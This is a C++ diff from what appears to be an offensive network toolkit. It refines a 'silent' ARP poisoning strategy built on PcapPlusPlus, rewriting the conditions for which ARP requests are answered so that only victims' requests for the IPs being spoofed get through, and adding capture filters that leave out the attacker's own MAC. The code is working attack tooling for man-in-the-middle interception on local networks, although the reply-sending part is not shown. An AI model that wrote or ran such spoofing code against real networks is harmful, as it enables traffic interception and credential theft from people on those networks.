@@ -1,14 +1,17 @@
 #include "arp_poisoning/silent.h"
 #include "ArpLayer.h"
 #include "EthLayer.h"
+#include "IpAddress.h"
 #include "Packet.h"
 #include "PcapFilter.h"
 #include "PcapLiveDevice.h"
+#include "ProtocolType.h"
 #include "RawPacket.h"
 #include "log.h"
 #include <exception>
 #include <future>
 #include <stdexcept>
+#include <vector>
 
 void ATK::ARP::SilentArpPoisoningStrategy::onPacketArrives(
     pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) {
@@ -25,12 +28,19 @@ void ATK::ARP::SilentArpPoisoningStrategy::onPacketArrives(
         device->stopCapture();
     }
 
-    // determine whether or not to handle packet
-    if (requestEthLayer->getSourceMac() == device->getMacAddress() ||
+    bool isMessageToAttacker =
+        requestEthLayer->getSourceMac() == device->getMacAddress() ||
         requestEthLayer->getSourceMac() == attackerMac_ ||
-        (ipsToSpoof_.count(requestArpLayer->getTargetIpAddr()) != 0U ||
-         requestArpLayer->getTargetIpAddr() == device->getIPv4Address()) ||
-        victimIps_.count(requestArpLayer->getSenderIpAddr()) != 0U) {
+        requestArpLayer->getTargetIpAddr() == device->getIPv4Address();
+    bool isIpToSpoof =
+        std::find(ipsToSpoof_.begin(), ipsToSpoof_.end(),
+                  requestArpLayer->getTargetIpAddr()) != ipsToSpoof_.end();
+    bool isFromVictim =
+        std::find(victimIps_.begin(), victimIps_.end(),
+                  requestArpLayer->getSenderIpAddr()) != victimIps_.end();
+
+    // determine whether or not to handle packet
+    if (isMessageToAttacker || !isIpToSpoof || !isFromVictim) {
         LOG_INFO("skipped packet");
         return;
     }
@@ -68,9 +78,17 @@ void ATK::ARP::SilentArpPoisoningStrategy::execute() {
     // set filters
     pcpp::ArpFilter arpFilter(pcpp::ArpOpcode::ARP_REQUEST);
     pcpp::EtherTypeFilter etherTypeFilter(PCPP_ETHERTYPE_ARP);
+    pcpp::ProtoFilter protoFilter(pcpp::ARP);
+
+    // set filter to mac not to self
+    pcpp::MacAddressFilter deviceMacAdressFilter(device_->getMacAddress(),
+                                                 pcpp::Direction::SRC_OR_DST);
+    pcpp::NotFilter notDeviceMacAdress(&deviceMacAdressFilter);
     pcpp::AndFilter andFilter;
     andFilter.addFilter(&arpFilter);
     andFilter.addFilter(&etherTypeFilter);
+    andFilter.addFilter(&protoFilter);
+    andFilter.addFilter(&notDeviceMacAdress);
 
     if (!device_->setFilter(andFilter)) {
         device_->close();
